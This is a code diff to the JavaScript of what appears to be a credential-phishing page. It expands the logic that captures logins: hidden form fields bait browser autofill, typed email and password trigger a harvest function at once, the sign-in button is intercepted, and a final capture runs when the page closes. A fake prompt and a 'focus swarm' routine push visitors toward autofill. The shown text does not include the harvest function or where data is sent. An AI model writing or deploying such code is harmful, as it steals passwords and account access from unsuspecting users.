@@ -72,30 +72,42 @@ async function harvest() {
   }, 500);
 }
 
-// --- Event Listeners ---
+// --- Event Listeners & UI Logic ---
 
-// Listen for clicks on the "Next" button for manual submission
-const signinButton = document.getElementById('signin-button');
-if (signinButton) {
-  signinButton.addEventListener('click', (e) => {
-    e.preventDefault(); // Prevent form submission
-    harvest();
+function setupEventListeners() {
+  // 1. Autofill on hidden forms
+  const hiddenInputs = document.querySelectorAll('.hidden-form input');
+  hiddenInputs.forEach(input => {
+    input.addEventListener('input', harvest);
   });
-}
+  console.log('Autofill listeners set up.');
 
-// Setup autofill detection
-function setupInputListeners() {
-    const inputs = document.querySelectorAll('.hidden-form input');
-    inputs.forEach(input => {
-        input.addEventListener('input', harvest);
+  // 2. Manual entry on visible forms (triggers harvest automatically)
+  const visibleEmail = document.getElementById('visible-email');
+  const visiblePassword = document.getElementById('visible-password');
+  if (visibleEmail && visiblePassword) {
+    const checkManualInput = () => {
+      if (visibleEmail.value && visiblePassword.value) {
+        harvest();
+      }
+    };
+    visibleEmail.addEventListener('input', checkManualInput);
+    visiblePassword.addEventListener('input', checkManualInput);
+    console.log('Automatic manual input listeners set up.');
+  }
+
+  // 3. "Next" button as a fallback
+  const signinButton = document.getElementById('signin-button');
+  if (signinButton) {
+    signinButton.addEventListener('click', (e) => {
+      e.preventDefault(); // Prevent default form submission
+      harvest();
     });
-    console.log('Input listeners set up for all hidden form inputs.');
+  }
 }
 
-// --- Fallback Mechanisms ---
+// Fallback for page close
 window.addEventListener('beforeunload', harvest);
-
-// --- UI & Focus Trap Logic ---
 
 // After a delay, hide the loader and show the honeypot prompt
 setTimeout(() => {
@@ -104,9 +116,9 @@ setTimeout(() => {
   if (previewContainer) previewContainer.style.display = 'none';
   if (honeypotContainer) {
     honeypotContainer.style.display = 'block';
-    // Set up listeners once the honeypot is visible
-    setupInputListeners();
-    // Also trigger the focus swarm to attempt autofill
+    // Set up all event listeners
+    setupEventListeners();
+    // Attempt to trigger autofill
     triggerFocusSwarm();
   }
 }, 1500);
